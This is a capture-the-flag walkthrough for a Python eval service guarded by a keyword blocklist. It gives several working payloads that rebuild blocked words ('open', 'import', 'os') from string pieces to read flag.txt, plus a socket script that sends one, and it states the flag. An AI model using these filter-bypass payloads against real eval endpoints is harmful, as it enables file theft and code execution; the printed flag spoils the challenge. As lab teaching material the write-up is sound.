# Scoreboard Math walkthrough

1. Connect: `nc EVENT_HOST 8010`. Try `3*7+2` and you get `23`, so this is Python's `eval`.
2. Read `scoreboard.py`. Any line containing a blocked word (`import`, `open`, `os`, `flag`, ...) is rejected before it runs, but builtins like `getattr`, `vars`, `print` and `chr` still work.
3. The filter only looks at the text you typed. Python can build the blocked words at run time from pieces, so the filter never sees them:

   ```
   getattr(__builtins__, 'op'+'en')('fl'+'ag.txt').read()
   ```

   The console prints `'BarSides{string_glue_beats_word_filters}\n'`.

Other routes that work:

- `vars(__builtins__)['op'+'en']('fl'+'ag.txt').read()`
- `getattr(__builtins__, 'op'+'en')(chr(102)+'lag.txt').read()`
- `getattr(__builtins__, '__imp'+'ort__')('o'+'s').listdir()` to look around first.

No `nc`? Python works:

```python
import socket
s = socket.create_connection(("EVENT_HOST", 8010))
s.sendall(b"getattr(__builtins__,'op'+'en')('fl'+'ag.txt').read()\n")
print(s.recv(4096).decode(), s.recv(4096).decode())
```

Flag: `BarSides{string_glue_beats_word_filters}`
